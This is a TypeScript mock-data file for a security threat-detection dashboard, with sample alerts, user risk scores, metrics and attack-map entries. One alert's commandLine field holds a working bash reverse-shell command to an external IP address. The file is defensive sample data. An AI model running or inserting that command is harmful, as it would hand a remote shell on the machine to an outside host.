import { Alert, UserRisk, MetricCardData, Workspace } from "./types";

export const MOCK_WORKSPACES: Workspace[] = [
  {
    id: "ws-prod-global",
    name: "DV-PROD-GLOBAL",
    region: "us-east-1 / eu-west-1",
    sensorsActive: 148,
  },
  {
    id: "ws-staging-internal",
    name: "DV-STAGING-INT",
    region: "us-east-1 (Lab)",
    sensorsActive: 32,
  },
  { id: "ws-asia-pacific", name: "DV-APAC-PROD", region: "ap-southeast-1", sensorsActive: 54 },
];

export const MOCK_ALERTS: Alert[] = [
  {
    id: "AL-8491",
    timestamp: "2026-06-25T21:14:32Z",
    source: "srv-k8s-api-01",
    type: "Unusual Namespace Creation & Exec",
    severity: "critical",
    score: 94.8,
    status: "open",
    category: "process",
    description:
      "Anomalous bash execution detected inside a newly spawned system-privileged container.",
    details: {
      processPath: "/usr/bin/bash",
      parentProcess: "/usr/bin/containerd-shim",
      commandLine: "bash -i >& /dev/tcp/194.26.135.84/443 0>&1",
      isolationForestScore: 0.89,
      ipAddress: "194.26.135.84",
      port: 443,
      shapFactors: [
        { factor: "Remote IP reputation", impact: 0.35 },
        { factor: "Process lineage anomaly", impact: 0.28 },
        { factor: "Privileged terminal spawn", impact: 0.18 },
        { factor: "Time-of-day access frequency", impact: 0.08 },
      ],
    },
  },
  {
    id: "AL-8310",
    timestamp: "2026-06-25T21:08:15Z",
    source: "db-finance-postgres",
    type: "Multi-Source Database Dump",
    severity: "critical",
    score: 91.2,
    status: "investigating",
    category: "network",
    description: "Massive egress transfer from finance DB to an unclassified staging container.",
    details: {
      ipAddress: "10.240.4.19",
      port: 5432,
      bytesTransferred: 4892182000, // 4.8GB
      isolationForestScore: 0.84,
      shapFactors: [
        { factor: "Payload volume size", impact: 0.42 },
        { factor: "Destination subnet frequency", impact: 0.25 },
        { factor: "Database query complexity", impact: 0.14 },
      ],
    },
  },
  {
    id: "AL-7982",
    timestamp: "2026-06-25T20:45:10Z",
    source: "m_chen@enterprise.com",
    type: "Impossibly Fast Travel (Anomalous Login)",
    severity: "high",
    score: 84.5,
    status: "open",
    category: "authentication",
    description:
      "Authentication successful in Frankfurt, Germany, 18 minutes after physical login in Toronto, Canada.",
    details: {
      username: "m_chen@enterprise.com",
      ipAddress: "80.241.128.9",
      userAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
      isolationForestScore: 0.78,
      shapFactors: [
        { factor: "Geographic velocity limit", impact: 0.51 },
        { factor: "VPN server signature", impact: 0.22 },
        { factor: "MFA challenge bypass", impact: 0.11 },
      ],
    },
  },
  {
    id: "AL-7521",
    timestamp: "2026-06-25T19:30:22Z",
    source: "workstation-hr-12",
    type: "Local Credential Harvesting (LSASS Read)",
    severity: "high",
    score: 82.1,
    status: "open",
    category: "process",
    description:
      "LSASS.exe process memory read by unverified third-party executable run by HR specialist.",
    details: {
      processPath: "/Users/hr_specialist/Downloads/cv_parser_pro.exe",
      parentProcess: "/Applications/Google Chrome.app",
      commandLine: "cv_parser_pro.exe --force-all --temp-dir /var/tmp",
      isolationForestScore: 0.76,
      shapFactors: [
        { factor: "LSASS access handle creation", impact: 0.45 },
        { factor: "Unsigned binary execution", impact: 0.24 },
        { factor: "Directory path anomaly", impact: 0.13 },
      ],
    },
  },
  {
    id: "AL-7410",
    timestamp: "2026-06-25T18:15:00Z",
    source: "api-gateway-us",
    type: "Anomalous API Rate Bursts",
    severity: "medium",
    score: 68.3,
    status: "resolved",
    category: "network",
    description:
      "Sudden spike of 404 response codes from unique IP ranges targeting hidden system endpoints.",
    details: {
      ipAddress: "185.190.140.22",
      bytesTransferred: 142010,
      isolationForestScore: 0.61,
      shapFactors: [
        { factor: "404 HTTP ratio", impact: 0.38 },
        { factor: "IP rotation sequence", impact: 0.18 },
      ],
    },
  },
  {
    id: "AL-7102",
    timestamp: "2026-06-25T17:02:11Z",
    source: "aws-s3-backup-vault",
    type: "IAM Role Privilege Escalation",
    severity: "high",
    score: 79.9,
    status: "investigating",
    category: "system",
    description: "AssumeRole used by temporary EC2 instance to bypass S3 bucket restriction lists.",
    details: {
      username: "AssumedRole-S3-Manager",
      isolationForestScore: 0.73,
      shapFactors: [
        { factor: "IAM policy difference delta", impact: 0.39 },
        { factor: "AssumeRole execution path", impact: 0.24 },
        { factor: "Bucket access frequency", impact: 0.1 },
      ],
    },
  },
  {
    id: "AL-6291",
    timestamp: "2026-06-25T15:40:02Z",
    source: "corp-ad-controller",
    type: "Active Directory Kerberoasting Query",
    severity: "critical",
    score: 90.1,
    status: "dismissed",
    category: "authentication",
    description:
      "Rapid SPN (Service Principal Name) ticket requests resembling a systematic Kerberoasting sweep.",
    details: {
      username: "admin_migration_svc",
      ipAddress: "10.120.14.8",
      isolationForestScore: 0.86,
      shapFactors: [
        { factor: "SPN request frequency", impact: 0.44 },
        { factor: "Account type privilege", impact: 0.28 },
        { factor: "Origin host reputation", impact: 0.14 },
      ],
    },
  },
  {
    id: "AL-5820",
    timestamp: "2026-06-25T12:10:55Z",
    source: "srv-linux-dns-02",
    type: "DNS Tunneling Payload Detection",
    severity: "medium",
    score: 58.7,
    status: "resolved",
    category: "network",
    description:
      "Unusual subdomains containing high-entropy base64 sequences queried in rapid succession.",
    details: {
      ipAddress: "10.10.8.42",
      isolationForestScore: 0.54,
      shapFactors: [
        { factor: "DNS Query entropy", impact: 0.48 },
        { factor: "Query length anomaly", impact: 0.21 },
      ],
    },
  },
];

export const MOCK_USER_RISKS: UserRisk[] = [
  {
    username: "m_chen@enterprise.com",
    role: "Lead Platform Engineer",
    department: "Cloud Engineering",
    riskScore: 88,
    incidentCount: 4,
    avatar:
      "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80",
  },
  {
    username: "j_thompson@enterprise.com",
    role: "HR Specialist",
    department: "People & Talent",
    riskScore: 74,
    incidentCount: 2,
    avatar:
      "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80",
  },
  {
    username: "a_patel@enterprise.com",
    role: "Senior database Architect",
    department: "Data Infrastructure",
    riskScore: 62,
    incidentCount: 3,
    avatar:
      "https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?auto=format&fit=crop&w=100&q=80",
  },
  {
    username: "f_rodriguez@enterprise.com",
    role: "DevOps Engineer",
    department: "Cloud Operations",
    riskScore: 49,
    incidentCount: 1,
    avatar:
      "https://images.unsplash.com/photo-1438761681033-6461ffad8d80?auto=format&fit=crop&w=100&q=80",
  },
];

export const MOCK_METRICS: MetricCardData[] = [
  {
    title: "Global Threat Level",
    value: "84.2",
    change: "+4.1% over last 24h",
    isPositive: false,
    timeline: [62, 65, 70, 68, 74, 80, 84],
  },
  {
    title: "Isolated Container Nodes",
    value: "14",
    change: "+3 nodes isolated",
    isPositive: false,
    timeline: [4, 6, 5, 8, 10, 11, 14],
  },
  {
    title: "Isolation Forest Score (Avg)",
    value: "0.682",
    change: "-1.2% anomaly threshold delta",
    isPositive: true,
    timeline: [0.72, 0.71, 0.7, 0.69, 0.68, 0.685, 0.682],
  },
  {
    title: "RAG Threat Logs Processed",
    value: "2,491,802",
    change: "+24.8% ingestion velocity",
    isPositive: true,
    timeline: [1.8, 1.9, 2.1, 2.2, 2.3, 2.4, 2.49],
  },
];

// Recharts line/area data representing risk score fluctuations
export const HISTORICAL_RISK_DATA = [
  { time: "16:00", authentication: 42, network: 31, process: 52, system: 21 },
  { time: "17:00", authentication: 50, network: 45, process: 64, system: 25 },
  { time: "18:00", authentication: 45, network: 58, process: 48, system: 40 },
  { time: "19:00", authentication: 72, network: 41, process: 59, system: 38 },
  { time: "20:00", authentication: 88, network: 65, process: 76, system: 44 },
  { time: "21:00", authentication: 94, network: 91, process: 89, system: 79 },
];

export const MOCK_WORLD_ATTACKS = [
  {
    fromName: "Frankfurt",
    fromCoords: { x: 480, y: 150 },
    toName: "DV-PROD-GLOBAL",
    toCoords: { x: 220, y: 180 },
    severity: "critical",
    type: "Container Privileged Esc",
  },
  {
    fromName: "Shenzhen",
    fromCoords: { x: 740, y: 240 },
    toName: "DV-APAC-PROD",
    toCoords: { x: 780, y: 300 },
    severity: "high",
    type: "S3 AssumeRole Bypass",
  },
  {
    fromName: "Bucharest",
    fromCoords: { x: 520, y: 160 },
    toName: "DV-PROD-GLOBAL",
    toCoords: { x: 220, y: 180 },
    severity: "high",
    type: "Kerberoasting Sweep",
  },
  {
    fromName: "Dublin",
    fromCoords: { x: 430, y: 130 },
    toName: "DV-STAGING-INT",
    toCoords: { x: 220, y: 180 },
    severity: "medium",
    type: "Fast Auth Login",
  },
  {
    fromName: "Sao Paulo",
    fromCoords: { x: 340, y: 380 },
    toName: "DV-PROD-GLOBAL",
    toCoords: { x: 220, y: 180 },
    severity: "low",
    type: "DNS Tunneling",
  },
];
